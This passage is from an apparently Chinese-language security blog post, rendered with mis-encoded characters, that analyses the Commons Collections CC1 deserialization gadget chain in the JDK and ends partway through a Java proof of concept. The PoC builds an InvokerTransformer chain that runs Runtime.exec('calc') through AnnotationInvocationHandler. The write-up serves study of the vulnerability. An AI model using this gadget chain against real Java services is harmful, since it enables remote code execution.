</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">var10</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="n">var9</span><span class="p">.</span><span class="na">getKey</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">var11</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Class</span><span class="w"> </span><span class="n">var12</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Class</span><span class="p">)</span><span class="n">var6</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">var10</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">var12</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">var11</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var9</span><span class="p">.</span><span class="na">getValue</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">var12</span><span class="p">.</span><span class="na">isInstance</span><span class="p">(</span><span class="n">var11</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="p">(</span><span class="n">var11</span><span class="w"> </span><span class="k">instanceof</span><span class="w"> </span><span class="n">ExceptionProxy</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">var11</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">AnnotationTypeMismatchExceptionProxy</span><span class="p">(</span><span class="n">var11</span><span class="p">.</span><span class="na">getClass</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;[&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">var11</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;]&#34;</span><span class="p">)).</span><span class="na">setMember</span><span class="p">((</span><span class="n">Method</span><span class="p">)</span><span class="n">var5</span><span class="p">.</span><span class="na">members</span><span class="p">().</span><span class="na">get</span><span class="p">(</span><span class="n">var10</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AnnotationInvocationHandler</span><span class="p">.</span><span class="na">UnsafeAccessor</span><span class="p">.</span><span class="na">setType</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="n">var3</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AnnotationInvocationHandler</span><span class="p">.</span><span class="na">UnsafeAccessor</span><span class="p">.</span><span class="na">setMemberValues</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="n">var7</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h5 id="ç®€å•åˆ†æ1-var6get">ç®€å•åˆ†æ1 var6.get<a hidden class="anchor" aria-hidden="true" href="#ç®€å•åˆ†æ1-var6get">#</a></h5>
<p>è¿™é‡Œæˆ‘èµ·åˆè§‰å¾—var6.getè¿™é‡Œå¯ä»¥ç”¨</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">var6</span> <span class="o">=&gt;</span> <span class="n">var5çš„this</span><span class="o">.</span><span class="n">memberTypes</span> <span class="o">=&gt;</span> <span class="n">var3</span> <span class="o">=&gt;</span><span class="n">AnnotationInvocationHandlerçš„typeå±æ€§</span>
</span></span></code></pre></div><p>ä½†æ˜¯è¿™é‡Œ</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">var5</span> <span class="o">=</span> <span class="n">AnnotationType</span><span class="o">.</span><span class="n">getInstance</span><span class="p">(</span><span class="n">var3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="n">var5çš„this</span><span class="o">.</span><span class="n">memberTypesæˆ‘ä»¬æ˜¯ä¸å¯æ§çš„</span><span class="err">ï¼Œæ‰€ä»¥è¿™é‡Œåˆ©ç”¨ä¸äº†</span>
</span></span></code></pre></div><p>è·Ÿè¸ª<code>AnnotationType.getInstance</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">AnnotationType</span><span class="w"> </span><span class="nf">getInstance</span><span class="p">(</span><span class="n">Class</span><span class="o">&lt;?</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">Annotation</span><span class="o">&gt;</span><span class="w"> </span><span class="n">var0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">//1.è¿™é‡Œè¦ç»§æ‰¿Annotation</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">JavaLangAccess</span><span class="w"> </span><span class="n">var1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SharedSecrets</span><span class="p">.</span><span class="na">getJavaLangAccess</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">AnnotationType</span><span class="w"> </span><span class="n">var2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var1</span><span class="p">.</span><span class="na">getAnnotationType</span><span class="p">(</span><span class="n">var0</span><span class="p">);</span><span class="w">  </span><span class="c1">//2.è¿™é‡Œç±»ä¼¼è½¬æ¢ç±»å‹</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">var2</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">var2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AnnotationType</span><span class="p">(</span><span class="n">var0</span><span class="p">);</span><span class="w">  </span><span class="c1">//3.è¿™é‡Œè¿›è¡Œåˆå§‹åŒ–ï¼Œç„¶åè¿”å›AnnotationTypeå¯¹è±¡åˆ°returnåˆ°ä¸Šä¸€å±‚</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">var1</span><span class="p">.</span><span class="na">casAnnotationType</span><span class="p">(</span><span class="n">var0</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">AnnotationType</span><span class="p">)</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="n">var2</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">var2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var1</span><span class="p">.</span><span class="na">getAnnotationType</span><span class="p">(</span><span class="n">var0</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">assert</span><span class="w"> </span><span class="n">var2</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">var2</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>æŸ¥çœ‹AnnotationTypeåˆå§‹åŒ–</p>
<p><img loading="lazy" src="../images/image-20241106105833022.png" alt="image-20241106105833022"  />
</p>
<p>var1æ˜¯æˆ‘ä»¬ä¼ å…¥çš„<code>class</code>ï¼Œæˆ‘ä»¬ä¸»è¦çœ‹<code>this.memberTypes.put</code>å±æ€§ï¼Œè¿™é‡Œå…ˆæ˜¯hashmapåˆå§‹åŒ–å¤§å°ï¼Œæœ€åä¸¤è¡Œ<code>this.memberTypes.put()</code>å°†var1çš„classçš„æ–¹æ³•å­˜å…¥åˆ°<code>memberTypes</code>ä¸­ã€‚</p>
<p>æœ‰äººå¯èƒ½ä¼šé—®ä¸ºä»€ä¹ˆä¸èƒ½åå°„å‘¢ï¼Œè¿™é‡Œè°ƒè¯•è¿›æ¥ç‚¹æ˜¯readobjectï¼Œè¿™é‡Œæˆ‘ä»¬åªèƒ½æ§åˆ¶var1ï¼Œè€Œä¸”<code>memberTypes</code>å€¼å±äºHashmap</p>
<p>è¿˜æ˜¯ä¼šè°ƒç”¨åˆ°<code>Hashmap.get</code>çš„ï¼Œè¿™é‡Œå¸¸è§„ä½¿ç”¨å°±æ˜¯å–å¯¹åº”æ–¹æ³•åå­—çš„<code>Method</code>ï¼Œç¬”è€…ç§¯ç´¯çš„è¿˜å¤šï¼Œä¸çŸ¥é“è¿™ä¸ªèƒ½åˆ©ç”¨ä¸ã€‚</p>
<p>å›å½’æ­£é¢˜ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾8u71ä»¥ä¸‹ç‰ˆæœ¬å¤ç°</p>
<h5 id="è¶£äº‹1-jdkä¸‹è½½">è¶£äº‹1 jdkä¸‹è½½<a hidden class="anchor" aria-hidden="true" href="#è¶£äº‹1-jdkä¸‹è½½">#</a></h5>
<p><img loading="lazy" src="../images/0d7772c90ea2c26c00239d70baaf1b5.png" alt="0d7772c90ea2c26c00239d70baaf1b5"  />
</p>
<p>ä¸çŸ¥é“æˆ‘çš„é—®é¢˜è¿˜æ˜¯ä»€ä¹ˆï¼Œåæ­£å°±æ˜¯æˆ‘ç‚¹å‡»å¯¹åº”ç‰ˆæœ¬ä¸‹è½½å‡ºæ¥çš„ç‰ˆæœ¬å’Œæˆ‘ä¸ä¸€æ ·ï¼Œæ¯”å¦‚è¿™é‡Œæˆ‘<code>8u20</code>å•Šï¼Œå‡ºæ¥å´æ˜¯<code>8u74</code>ï¼</p>
<p>ç„¶åæŠ“åŒ…çœ‹äº†ä¸‹ï¼Œæˆ‘8u20çš„ä¸‹è½½é“¾æ¥ç¡®å®ä¸å¯¹ï¼Œä¸Šé¢æ˜¯å…¶ä»–ç‰ˆæœ¬çš„ã€‚ç„¶åæˆ‘åˆå»æ‰¾äº†ä¸‹å…¶ä»–ç‰ˆæœ¬ä¸‹è½½é“¾æ¥ï¼Œç„¶åå‘ç°å¤§æ¦‚æ˜¯ä¸‹é¢è¿™ä¸ª</p>
<p>ä½†æ˜¯b02ä¸æ˜¯å›ºå®šï¼Œæ¯å‡ ä¸ªç‰ˆæœ¬æœ‰ä¸ä¸€æ ·ï¼Œæœ€åçˆ†ç ´ä¸‹è¿™ä¸ªbã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">download</span><span class="o">.</span><span class="n">oracle</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">otn</span><span class="o">/</span><span class="n">java</span><span class="o">/</span><span class="n">jdk</span><span class="o">/</span><span class="mi">8</span><span class="n">u73</span><span class="o">-</span><span class="n">b02</span><span class="o">/</span><span class="n">jdk</span><span class="o">-</span><span class="mi">8</span><span class="n">u73</span><span class="o">-</span><span class="n">windows</span><span class="o">-</span><span class="n">x64</span><span class="o">.</span><span class="n">exe</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">otn</span><span class="o">/</span><span class="n">java</span><span class="o">/</span><span class="n">jdk</span><span class="o">/</span><span class="mi">7</span><span class="n">u21</span><span class="o">-</span><span class="n">b11</span><span class="o">/</span><span class="n">jdk</span><span class="o">-</span><span class="mi">7</span><span class="n">u21</span><span class="o">-</span><span class="n">windows</span><span class="o">-</span><span class="n">x64</span><span class="o">.</span><span class="n">exe</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">otn</span><span class="o">/</span><span class="n">java</span><span class="o">/</span><span class="n">jdk</span><span class="o">/</span><span class="mi">8</span><span class="n">u40</span><span class="o">-</span><span class="n">b26</span><span class="o">/</span><span class="n">jdk</span><span class="o">-</span><span class="mi">8</span><span class="n">u40</span><span class="o">-</span><span class="n">windows</span><span class="o">-</span><span class="n">x64</span><span class="o">.</span><span class="n">exe</span>
</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">otn</span><span class="o">/</span><span class="n">java</span><span class="o">/</span><span class="n">jdk</span><span class="o">/</span><span class="mi">8</span><span class="n">u20</span><span class="o">-</span><span class="n">b26</span><span class="o">/</span><span class="n">jdk</span><span class="o">-</span><span class="mi">8</span><span class="n">u20</span><span class="o">-</span><span class="n">windows</span><span class="o">-</span><span class="n">x64</span><span class="o">.</span><span class="n">exe</span>
</span></span></code></pre></div><p>å¦‚æ„¿ä¸‹åˆ°<code>8u20</code>å˜¿å˜¿</p>
<p><img loading="lazy" src="../images/image-20241106111303447.png" alt="image-20241106111303447"  />
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">download</span><span class="o">.</span><span class="n">oracle</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">otn</span><span class="o">/</span><span class="n">java</span><span class="o">/</span><span class="n">jdk</span><span class="o">/</span><span class="mi">8</span><span class="n">u20</span><span class="o">-</span><span class="n">b26</span><span class="o">/</span><span class="n">jdk</span><span class="o">-</span><span class="mi">8</span><span class="n">u20</span><span class="o">-</span><span class="n">windows</span><span class="o">-</span><span class="n">x64</span><span class="o">.</span><span class="n">exe</span>
</span></span></code></pre></div><p>æˆ‘ä»¬çœ‹åˆ°8u20çš„<code>AnnotationInvocationHandler.readObject</code>ï¼Œè°ƒè¯•å‘ç°æœ‰ç‚¹é—®é¢˜</p>
<p><img loading="lazy" src="../images/image-20241106112028504.png" alt="image-20241106112028504"  />
</p>
<h5 id="é—®é¢˜2-æ–­ç‚¹">é—®é¢˜2 æ–­ç‚¹<a hidden class="anchor" aria-hidden="true" href="#é—®é¢˜2-æ–­ç‚¹">#</a></h5>
<p><img loading="lazy" src="../images/image-20241106164712906.png" alt="image-20241106164712906"  />
</p>
<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°æœ‰äº›æ–­ç‚¹æ®µä¸åˆ°ï¼Œè¿™æ˜¯å› ä¸ºæ˜¯classæ–‡ä»¶çš„åŸå› ï¼Œæºç ä¸å®Œæ•´ï¼Œæˆ‘ä»¬éœ€è¦å»ä¸‹è½½æºç </p>
<p><strong>è§£å†³ï¼š</strong></p>
<p><a href="https://cloud.tencent.com/developer/article/1413521">8uä½ç‰ˆæœ¬è·å–æ–¹æ³•</a></p>
<p><a href="https://hg.openjdk.org/jdk8u/jdk8u20/jdk/file/f5d77a430a29/">å¯¹åº”8u20çš„æºç =&gt;ç‚¹å‡»å·¦ä¸‹zipå³å¯ä¸‹è½½</a></p>
<blockquote>
<p>å†è¿›å…¥åˆ°ç›¸åº”JDKçš„æ–‡ä»¶å¤¹ä¸­ï¼Œé‡Œé¢æœ¬æ¥å°±æœ‰ä¸ªsrc.zipçš„å‹ç¼©åŒ…ï¼Œæˆ‘ä»¬è§£å‹åˆ°å½“å‰æ–‡ä»¶å¤¹ä¸‹srcï¼Œç„¶åæŠŠä¹‹å‰æºç åŒ…(jdk-f5d77a430a29.zip)ä¸­/src/share/classesä¸‹çš„sunæ–‡ä»¶å¤¹æ‹·è´åˆ°srcæ–‡ä»¶å¤¹ä¸­å»ã€‚æ‰“å¼€IDEAï¼Œé€‰æ‹©æ–‡ä»¶ &mdash;&gt;é¡¹ç›®ç»“æ„ &mdash;&gt;SDK &mdash;&gt;æºè·¯å¾„ &mdash;&gt;æŠŠsrcæ–‡ä»¶å¤¹æ·»åŠ åˆ°æºè·¯å¾„ä¸‹ï¼Œä¿å­˜å³å¯ã€‚</p>
</blockquote>
<p><img loading="lazy" src="../images/image-20241106170406370.png" alt="image-20241106170406370"  />
</p>
<p><img loading="lazy" src="../images/image-20241106170504673.png" alt="image-20241106170504673"  />
</p>
<p><img loading="lazy" src="../images/image-20241106170559564.png" alt="image-20241106170559564"  />
</p>
<p>å†çœ‹æ—¶å‘ç°æºç éƒ½å˜äº†</p>
<h5 id="æ­£ç‰‡å¼€å§‹">æ­£ç‰‡å¼€å§‹<a hidden class="anchor" aria-hidden="true" href="#æ­£ç‰‡å¼€å§‹">#</a></h5>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">sun</span><span class="p">.</span><span class="na">reflect</span><span class="p">.</span><span class="na">annotation</span><span class="p">.</span><span class="na">AnnotationInvocationHandler</span><span class="p">.</span><span class="na">readObject</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">AbstractInputCheckedMapDecorator</span><span class="p">.</span><span class="na">setValue</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    	</span><span class="n">TransformedMap</span><span class="p">.</span><span class="na">checkSetValue</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="n">ChainedTransformer</span><span class="p">.</span><span class="na">transform</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="n">è¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œçš„ç›®çš„</span><span class="w">
</span></span></span></code></pre></div><p>è¿™é‡Œå…ˆæ”¾pocï¼Œæˆ‘æ˜¯è¾¹è°ƒè¾¹æ”¹pocï¼Œæ„Ÿè§‰æè¿°çš„è¯è·Ÿç€pocå¥½æè¿°ç‚¹</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.LazyMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.annotation.Annotation</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.annotation.Target</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationTargetException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Collections</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">CC1_TransformedMap</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvokerTransformer</span><span class="w"> </span><span class="n">invokerTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">});</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ConstantTransformer</span><span class="w"> </span><span class="n">constantTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">transformers</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="n">constantTransformer</span><span class="p">,</span><span class="n">invokerTransformer</span><span class="p">,</span><span class="n">invokerTransformer1</span><span class="p">,</span><span class="n">invokerTransformer2</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="w"> </span><span class="n">keyTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">declaredConstructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredConstructor</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="w"> </span><span class="n">hashmap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hashmap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;value&#34;</span><span class="p">,</span><span class="n">1111</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TransformedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">hashmap</span><span class="p">,</span><span class="kc">null</span><span class="p">,</span><span class="n">keyTransformer</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">declaredConstructor</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Target</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">map</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">fos</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileInputStream</span><span class="w"> </span><span class="n">fis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
